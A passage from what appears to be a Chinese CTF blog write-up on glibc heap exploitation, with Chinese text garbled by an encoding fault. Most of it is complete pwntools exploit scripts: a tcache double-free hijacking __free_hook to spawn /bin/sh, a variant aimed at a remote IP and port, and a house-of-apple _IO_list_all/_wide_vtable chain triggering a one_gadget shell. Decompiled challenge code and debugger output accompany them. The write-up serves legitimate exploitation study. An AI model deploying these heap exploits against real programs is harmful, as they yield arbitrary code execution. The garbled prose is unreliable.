class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input size: \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input content: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice: \n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input index: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#add(0x80)#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x260</span></span><br><span class="line">tcache = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(tcache))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, p8(<span class="number">0x7</span>)*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="æ€è·¯2ï¼Œå‚è€ƒNameless-a"><a href="#æ€è·¯2ï¼Œå‚è€ƒNameless-a" class="headerlink" title="æ€è·¯2ï¼Œå‚è€ƒNameless_a"></a>æ€è·¯2ï¼Œå‚è€ƒ<a href="https://bbs.kanxue.com/thread-274580.htm#msg_header_h3_0">Nameless_a</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. æ„é€ double freeï¼Œæ³„éœ²å‡ºheap_baseçš„åœ°å€</span><br><span class="line">2. ä¸æ–­é‡Šæ”¾åŒä¸€ä¸ªå †å—ï¼ˆå¹¶ä¿®æ”¹bkæŒ‡é’ˆï¼‰ï¼Œç›´è‡³å¡«æ»¡0x80çš„tcacheå¹¶æº¢å‡ºä¸€ä¸ªè‡³unsorted binï¼Œ æ‹¿åˆ°libc_base</span><br><span class="line">3. åˆ©ç”¨double freeï¼ŒåŠ«æŒ__free_hook</span><br></pre></td></tr></table></figure><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> r </span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="comment">##r=process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">    r=remote(<span class="string">&quot;1.14.97.218&quot;</span>,<span class="number">24360</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">## leak_heap</span></span><br><span class="line">    add(<span class="number">0x7f</span>)</span><br><span class="line">    add(<span class="number">0x7f</span>)</span><br><span class="line">    <span class="comment">##add(0x7f)</span></span><br><span class="line">    <span class="comment">##add(0x7f)</span></span><br><span class="line">    delet(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">    heapbase=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&quot;heapbase:&quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">##leak libc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">        edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">        delet(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    libcbase=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">    log.success(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">## set_libc func</span></span><br><span class="line">    free_hook=libcbase+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]   </span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x7f</span>) <span class="comment">##,&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">    add(<span class="number">0x7f</span>) <span class="comment">##,p64(system))</span></span><br><span class="line">    edit(<span class="number">3</span>,p64(system))</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    <span class="comment">##z()</span></span><br><span class="line">    delet(<span class="number">0</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h2 id="libc2-31"><a href="#libc2-31" class="headerlink" title="libc2.31"></a>libc2.31</h2><h3 id="ç‰¹å¾-1"><a href="#ç‰¹å¾-1" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h3><p><code>__free_hook</code>å’Œ<code>__malloc_hook</code>éƒ½è¿˜åœ¨ï¼Œå¯ä»¥åŠ«æŒã€‚</p><h2 id="libc2-35"><a href="#libc2-35" class="headerlink" title="libc2.35"></a>libc2.35</h2><h3 id="ç‰¹å¾-2"><a href="#ç‰¹å¾-2" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h3><p><code>libc2.34</code>ä¹‹åçš„ç‰ˆæœ¬åˆ©ç”¨æ‰‹æ³•æš‚æ—¶æ— å·®åˆ«ï¼Œ<code>__free_hook</code>ã€<code>__malloc_hook</code>å’Œ<code>__realloc_hook</code>å·²è¢«åˆ é™¤ï¼ŒåŸºæœ¬æ˜¯<code>IO</code>é“¾åˆ©ç”¨çš„ä¸»åœºã€‚</p><h3 id="UAF1"><a href="#UAF1" class="headerlink" title="UAF1"></a>UAF1</h3><p>ä¾‹é¢˜ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ¥æºï¼šæŸé¹­æ¯-note2</span><br><span class="line">libcç‰ˆæœ¬ï¼šubuntu2.35-0-3.1</span><br><span class="line">æ¼æ´ï¼šUAF</span><br><span class="line">é™åˆ¶ï¼šå †å—å¤§å° &lt;= 0x200</span><br><span class="line">     å †å—çš„id &lt;= 9</span><br></pre></td></tr></table></figure><p>MENUï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--- menu ---&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) malloc&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) free&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) view&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4) leave&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ADDï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">op_malloc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();<span class="comment">//index&gt;10ä¼šè·³å‡º</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  size = get_number();</span><br><span class="line">  <span class="keyword">if</span> ( !size || size &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Interesting...&quot;</span>);</span><br><span class="line">  *(&amp;chonks + index) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(*(&amp;chonks + index), size, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DELETEï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">op_free</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;chonks + index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VIEWï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">op_view</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index?&quot;</span>);</span><br><span class="line">  index = get_index();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(&amp;chonks + index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LEAVEï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( number == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.ç”³è¯·å¹¶é‡Šæ”¾0x80çš„å †å—ï¼Œå¡«æ»¡tcache binï¼Œæº¢å‡ºä¸€ä¸ªåˆ°unsorted binï¼Œå³å¯æ³„éœ²å‡ºlibc_baseã€heap_base</span><br><span class="line">2. ç”³è¯·å›æ‰€æœ‰é‡Šæ”¾çš„å †å—</span><br><span class="line">3. ç”³è¯·å¹¶é‡Šæ”¾0x70çš„å †å—ï¼Œå¡«æ»¡tcache binï¼Œæº¢å‡ºä¸€ä¸ªåˆ°fast binï¼Œå³å¯åˆ©ç”¨UAFç”³è¯·åˆ°_IO_list_allï¼Œæ„é€ house of apple</span><br><span class="line">4. exité€€å‡ºè°ƒç”¨é“¾</span><br></pre></td></tr></table></figure><h4 id="è°ƒè¯•ä¿¡æ¯"><a href="#è°ƒè¯•ä¿¡æ¯" class="headerlink" title="è°ƒè¯•ä¿¡æ¯"></a>è°ƒè¯•ä¿¡æ¯</h4><p>åŠ«æŒ<code> _IO_list_all</code> ä¸ºç›®æ ‡å †ï¼š<br><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311721220.png" alt="image-20230831172114112"></p><p>ç›®æ ‡å †å³<code>fake_IO_list_all</code>ç»“æ„ä½“æ„é€ å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311723014.png" alt="image-20230831172354945"></p><p>ä¼ªé€ çš„<code>_wide_data</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå…¶ä½™å€¼å‡ä¸º0ï¼Œä¼ªé€ äº†<code>_wide_vtable</code>ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311733446.png" alt="image-20230831173315327"></p><p>ä¼ªé€ çš„<code>_wide_vtable</code>ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311735539.png" alt="image-20230831173542495"></p><p>æœ€åé€šè¿‡<code>exit()</code>è§¦å‘å¦‚ä¸‹çš„é“¾å­ï¼š</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202308311739977.png" alt="image-20230831173942904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â–º f 0   0x7fa1a3283c14 _IO_wdoallocbuf+36</span><br><span class="line">  f 1   0x7fa1a3286675 _IO_wfile_overflow+613</span><br><span class="line">  f 2   0x7fa1a328ea42 _IO_flush_all_lockp+226</span><br><span class="line">  f 3   0x7fa1a328ebfe _IO_cleanup+46</span><br><span class="line">  f 4   0x7fa1a3245542 __run_exit_handlers+434</span><br><span class="line">  f 5   0x7fa1a3245610 on_exit</span><br><span class="line">  f 6   0x55e7639cc575 main+184</span><br><span class="line">  f 7   0x7fa1a3229d90 __libc_start_call_main+128</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">view(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">_IO_file_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line"><span class="comment"># stdout = libc_base + libc.sym[&quot;stdout&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">b&#x27;ccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">fake_IO_list_all_addr = heap_base + <span class="number">0xc30</span></span><br><span class="line">fake_IO_list_all = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)           <span class="comment">#_IO_write_ptr</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_list_all_addr + <span class="number">0xe0</span>)   <span class="comment">#fake _wide_data</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)  <span class="comment">#vtable</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xe0</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_list_all += p64(heap_base + <span class="number">0xe40</span>)  <span class="comment">#fake _wide_vtable</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, fake_IO_list_all)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&#x27;eee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(_IO_list_all^key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, p64(fake_IO_list_all_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_vtable = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_vtable = fake_wide_vtable.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, fake_wide_vtable)</span><br><span class="line">leave()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="UAF2"><a href="#UAF2" class="headerlink" 